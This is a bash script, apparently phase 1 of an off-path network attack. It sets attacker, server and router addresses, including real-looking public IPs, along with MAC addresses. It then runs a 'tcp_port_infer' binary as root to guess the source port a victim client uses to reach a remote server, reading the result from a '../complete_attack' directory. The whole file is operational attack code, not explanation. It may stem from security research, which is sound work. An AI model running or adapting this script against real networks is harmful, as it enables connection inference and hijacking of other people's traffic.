# !/bin/bash
ATTACKER_PRIVATE_IP=ddbe:48ec:56c6:0:820:a625:7e19:7604; 
REMOTE_SERVER_IPv6=ddbe:48ec:56c6:1111:0000:0000:2b9f:276e; 
REMOTE_SERVER_IP=43.159.39.110; #
REMOTE_SERVER_PORT=1000; #
ROUTER_WAN_IP=166.111.238.1; 
PACKET_IFACE="en0"; 
SELF_MAC_ADDRESS="42:f8:3a:22:c0:e4";
ROUTER_MAC_ADDRESS="a4:39:b3:74:b0:65";
PORT_SEARCH_RANGE=1000;

printf "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 1 ~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"


echo `date`
echo "determining if client is talking to ${REMOTE_SERVER_IP}:${REMOTE_SERVER_PORT} on any port.."


sudo ./tcp_port_infer ${ATTACKER_PRIVATE_IP} ${REMOTE_SERVER_IPv6} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${ROUTER_WAN_IP} ${PACKET_IFACE} ${SELF_MAC_ADDRESS} ${ROUTER_MAC_ADDRESS} ${PORT_SEARCH_RANGE}

PORT_INFER_RESULT=$(cat ../complete_attack/PORT_INFER_RESULT)
GUESSED_CLIENT_PORT=$(echo "$PORT_INFER_RESULT" |grep -o "source-port: .*"| awk -F": " '{print $2}'|head -n 1)

echo "phase 1 port result: ${GUESSED_CLIENT_PORT}"
echo `date`
